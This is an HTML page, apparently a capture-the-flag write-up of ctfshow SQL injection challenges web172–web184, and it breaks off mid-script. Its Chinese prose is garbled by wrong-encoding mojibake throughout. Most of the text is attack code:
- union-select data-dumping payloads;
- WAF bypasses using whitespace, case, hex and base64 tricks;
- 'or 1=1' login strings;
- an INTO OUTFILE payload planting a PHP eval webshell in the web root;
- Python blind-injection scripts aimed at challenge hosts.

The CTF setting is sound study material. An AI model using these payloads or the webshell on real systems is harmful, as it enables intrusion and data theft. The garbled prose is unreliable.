class="headerlink" title="web172"></a>web172</h4><p>è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œåªä¸è¿‡è¿™é‡ŒæŠŠflagæ¢åˆ°å¦ä¸€ä¸ªè¡¨<code>ctfshow_user2</code>é‡Œäº†ï¼Œè€Œä¸”å­—æ®µæ•°æ”¹ä¸º2äº†</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">çˆ†ç ´è¡¨å-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+çˆ†ç ´åˆ—å-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+çˆ†ç ´flag-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre><h4 id="web173-å›æ˜¾æ£€æµ‹"><a href="#web173-å›æ˜¾æ£€æµ‹" class="headerlink" title="web173(å›æ˜¾æ£€æµ‹)"></a>web173(å›æ˜¾æ£€æµ‹)</h4><p>è¿”å›é€»è¾‘å¤šäº†é™åˆ¶ï¼Œå›æ˜¾ä¸èƒ½æœ‰flagï¼Œä½†æ˜¯ç›´æ¥æŸ¥flagå›æ˜¾æ˜¯ctfshow</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre><p>æˆ–è€…ä½¿ç”¨å…¶ä»–ç»•è¿‡å§¿åŠ¿  <strong>ç¼–ç ç»•è¿‡,base64ï¼Œhex</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre><h4 id="web174-replace"><a href="#web174-replace" class="headerlink" title="web174(replace)"></a>web174(replace)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   </code></pre><p>é™åˆ¶äº†æ•°å­—å’Œ<code>flag</code></p><p>æ›¿æ¢ï¼šå°†æ•°æ®to_base64åŠ å¯†ï¼Œç„¶åå°†é‡Œé¢æ‰€æœ‰çš„æ•°å­—ç”¨replace()æ›¿æ¢</p><p>æ›¿æ¢æ–¹å¼ï¼š<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>ç­‰ç­‰</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre><p>ç„¶åä½¿ç”¨è„šæœ¬è§£å¯†å¾—åˆ°flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 flag64 <span class="token operator">=</span> <span class="token string">" "</span> flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web175-into-outfile"><a href="#web175-into-outfile" class="headerlink" title="web175(into outfile)"></a>web175(into outfile)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      </code></pre><p>è¿‡æ»¤ASCII0-127çš„å­—ç¬¦</p><p>1.å°†flagæŸ¥è¯¢ç»“æœä¼ å…¥1.txtï¼Œè®¿é—®url&#x2F;1.txtæ–‡ä»¶å¾—flag</p><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;--</code></pre><p>2.å°†ä¸€å¥è¯æœ¨é©¬ä¼ å…¥1.phpï¼Œä½¿ç”¨èšå‰‘é“¾æ¥åï¼Œè®¿é—®æ•°æ®åº“ï¼ŒæŸ¥è¯¢flag</p><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><p>burp-decoderâ€”&gt;base64åŠ å¯†ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨urlåŠ å¯†è¡¨ç¤º</p><p>payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><h4 id="web176-å¤§å°å†™ç»•è¿‡"><a href="#web176-å¤§å°å†™ç»•è¿‡" class="headerlink" title="web176(å¤§å°å†™ç»•è¿‡)"></a>web176(å¤§å°å†™ç»•è¿‡)</h4><p>banäº†selectï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union seLect 1,2,password from ctfshow_user--+</code></pre><h4 id="web177-ç»•è¿‡ç©ºæ ¼"><a href="#web177-ç»•è¿‡ç©ºæ ¼" class="headerlink" title="web177(&#x2F;**&#x2F;ç»•è¿‡ç©ºæ ¼)"></a>web177(&#x2F;**&#x2F;ç»•è¿‡ç©ºæ ¼)</h4><p>æŠŠç©ºæ ¼ç»™è¿‡æ»¤æ‰äº†ï¼Œå°±ç›¸å½“äºæŠŠæ³¨é‡Šç¬¦â€“ ç»™è¿‡æ»¤æ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&#x2F;**&#x2F;æˆ–è€…æ˜¯%0aï¼ˆå›è½¦ï¼‰æ¥ç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ï¼Œ%23ï¼ˆ#ï¼‰æ¥ç»•è¿‡æ³¨é‡Šç¬¦çš„è¿‡æ»¤</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;where&#x2F;**&#x2F;username&#x3D;&#39;flag&#39;%23</code></pre><h4 id="web178-090a0b0c0dç»•ç©ºæ ¼"><a href="#web178-090a0b0c0dç»•ç©ºæ ¼" class="headerlink" title="web178(%090a0b0c0dç»•ç©ºæ ¼*)"></a>web178(%090a0b0c0dç»•ç©ºæ ¼*)</h4><p>å› ä¸ºå·²ç»è¿‡æ»¤äº†<code>*</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨å…¶å®ƒå­—ç¬¦æ¥ç»•è¿‡ç©ºæ ¼ï¼Œå¯ä»¥é€‰æ‹©</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span> tab<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">%</span><span class="token number">0</span>c<span class="token operator">%</span><span class="token number">0</span>d </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</code></pre><p>ä¸‡èƒ½å¯†ç </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;or%0a1&#x3D;1%231â€™or&#39;1&#39;&#x3D;&#39;1&#39;%23</code></pre><h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>æŠŠ<code>%09 %0a %0b %0d</code>è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨<code>%0c</code></p><p>æŠŠä¸Šé¢çš„é‚£ä¸ªå…¨æ¢æˆ<code>%0c</code></p><h4 id="web180-é—­åˆç»•è¿‡-23"><a href="#web180-é—­åˆç»•è¿‡-23" class="headerlink" title="web180(é—­åˆç»•è¿‡%23)"></a>web180(é—­åˆç»•è¿‡%23)</h4><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œ%23 ï¼Œç©ºæ ¼å¯ç”¨<code>%0c</code>ï¼Œ%23ç”¨<code>or&#39;1&#39;=&#39;&#39;</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername&#x3D;&#39;flag&#39;or&#39;1&#39;&#x3D;&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;or&#39;1&#39;&#x3D;&#39;1&#39;--%0c</code></pre><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>åŒä¸Š</p><h4 id="web182-likeæ¨¡ç³ŠåŒ¹é…"><a href="#web182-likeæ¨¡ç³ŠåŒ¹é…" class="headerlink" title="web182(likeæ¨¡ç³ŠåŒ¹é…)"></a>web182(likeæ¨¡ç³ŠåŒ¹é…)</h4><p>å¢åŠ äº†flagè¿‡æ»¤ã€‚likeå¯ä»¥æ¨¡ç³ŠåŒ¹é…ï¼Œæˆ–è€…åŒä¸Šä¸‡èƒ½å¯†ç </p><p><code>%0c</code>åœ¨æœ¬é¢˜ä¾æ—§å¯ç”¨ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;||(username)like&#39;%fla%</code></pre><p>likeå¯ä»¥ç”¨ä¸¤ä¸ªé€šé…ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼š</p><table><thead><tr><th>å­—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>%</code></td><td>åŒ¹é…ä»»ä½•æ•°ç›®çš„å­—ç¬¦ï¼Œç”šè‡³åŒ…æ‹¬é›¶å­—ç¬¦</td></tr><tr><td><code>_</code></td><td>åªèƒ½åŒ¹é…ä¸€ç§å­—ç¬¦</td></tr></tbody></table><h4 id="web183-å¸ƒå°”ç›²æ³¨"><a href="#web183-å¸ƒå°”ç›²æ³¨" class="headerlink" title="web183(å¸ƒå°”ç›²æ³¨)"></a>web183(å¸ƒå°”ç›²æ³¨)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>æŸ¥è¯¢ç»“æœ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      </code></pre><p>wafåˆå¢åŠ äº†ä¸€äº›ï¼Œé¢˜ç›®ä¹Ÿæœ‰å˜åŒ–äº†ã€‚æŸ¥è¯¢åˆ°çš„ç»“æœä¼šè¿”å›åˆ°ä¸‹é¢ç¬¬ä¸‰ä¸ªç°å—é‚£é‡Œã€‚</p><p>selectä¸èƒ½ç”¨ï¼Œå°±åªèƒ½é€‰æ‹©å¸ƒå°”ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨äº†ã€‚</p><p>è¿™é¢˜çš„è§£æ³•æ˜¯åœ¨å·²çŸ¥è¡¨åçš„æƒ…å†µä¸‹å®ç°çš„ï¼Œå†ç»“åˆæ¨¡ç³ŠåŒ¹é…likeæˆ–è€…æ­£åˆ™åŒ¹é…regexpã€‚<br>å†™è„šæœ¬å‰å…ˆæµ‹è¯•ä¸€ä¸‹è¯­å¥æ˜¯å¦èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå¯ä»¥çš„è¯ï¼Œå†å†™åˆ°è„šæœ¬é‡Œã€‚</p><p>å› ä¸ºæ¯æ¬¡æŸ¥è¯¢è®°å½•æ€»æ•°éƒ½æ˜¯1æ¡ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„flagï¼Œæ‰€ä»¥é¡µé¢å›ºå®šä¼šå‡ºç°$user_count &#x3D; 1;ï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where(substr(&#96;pass&#96;,1,1)regexp(&#39;a&#39;))</code></pre><p>Payloadï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'https://b2eacc14-603c-45c4-bc2a-0ce02478cc81.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagstr <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (1, 46)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"`ctfshow_user`where`pass`like\'ctfshow&#123;&#125;%\'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token comment"># 'tableName': f'`ctfshow_user`where(substr(`pass`,&#123;i&#125;,1)regexp('&#123;j&#125;'))'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„é¢˜ç›®ï¼Œå°±ç¡ä¸€æ®µæ—¶é—´</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><h4 id="web184-right-join-having"><a href="#web184-right-join-having" class="headerlink" title="web184(right join   having)"></a>web184(right join   having)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>where</code>ã€<code>&#39; &quot;</code>ã€åå¼•å·è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ã€‚</p><p><strong>æ–¹æ³•ä¸€ï¼šï¼ˆç”¨right joinç»•è¿‡è¿‡æ»¤ï¼‰</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96; as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</code></pre><p>RIGHT JOIN å…³é”®å­—ä»å³è¡¨ï¼ˆtable2ï¼‰è¿”å›æ‰€æœ‰çš„è¡Œï¼Œå³ä½¿å·¦è¡¨ï¼ˆtable1ï¼‰ä¸­æ²¡æœ‰åŒ¹é…ã€‚å¦‚æœå·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œåˆ™ç»“æœä¸º NULLã€‚</p><p>[right joinèœé¸Ÿæ•™ç¨‹](<a href="https://www.runoob.com/sql/sql-join-right.html">SQL RIGHT JOIN å…³é”®å­— | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a>)</p><p>è¿™é‡Œæ˜¯åˆ†åˆ«å°†ctfshow_ueré‡å‘½åä¸ºaå’Œbï¼Œæ¥ç€åœ¨bä¸­è¿›è¡Œç­›é€‰ï¼Œç„¶åç”¨<code>right join</code>å°†bä¸­ç­›é€‰å‡ºæ¥çš„å€¼ä¸aè¡¨çš„å€¼è¿›è¡ŒåŒ¹é…ã€‚</p><p>è¿™é‡Œç”¨<code>$user_count = 43;</code>ä½œä¸ºç­›é€‰æ¡ä»¶ã€‚</p><p>Y4tackerå¸ˆå‚…çš„ä»£ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://214a3dd9-ba25-480b-bdc0-0f33a1c754d8.challenge.ctf.show/select-waf.php"</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><p><strong>æ–¹æ³•äºŒï¼šï¼ˆwhereç”¨havingä»£æ›¿ï¼Œâ€™ â€œå¯ä»¥ç”¨ ()+Hexä»£æ›¿ï¼‰</strong></p><p>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œçœ‹çœ‹selectè¯­æ³•ã€‚å‘ç°havingå’Œwhereå¯ä»¥æ›¿æ¢ï¼Œä½†æ˜¯havingè¯­å¥æœ‰ä½¿ç”¨æ¡ä»¶ã€‚</p><blockquote><p>ä¸€ä¸ªHAVINGå­å¥å¿…é¡»ä½äºGROUP BYå­å¥ä¹‹åï¼Œå¹¶ä½äºORDER BYå­å¥ä¹‹å‰ã€‚</p></blockquote><p><a href="https://www.runoob.com/sql/sql-having.html">SQL HAVING å­å¥</a></p><p><img src="web184.png" loading="lazy"></p><p><strong>åå…­è¿›åˆ¶</strong>ï¼šå¯ä»¥å‰é¢åŠ xï¼Œåé¢ç”¨å¼•å·åŒ…è£¹æˆ–è€…0xï¼›ä¹Ÿå¯ä»¥å’Œç®—æ•°è¿ç®—ç»“åˆè¡¨ç¤ºæ•°å­—ã€‚</p><p><img src="web184_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25  #ctfshow&#123;%</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php"</span>flagstr<span class="token operator">=</span><span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>   <span class="token comment">#40</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„ï¼Œå°±ç¡ä¸€æ®µæ—¶é—´</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token 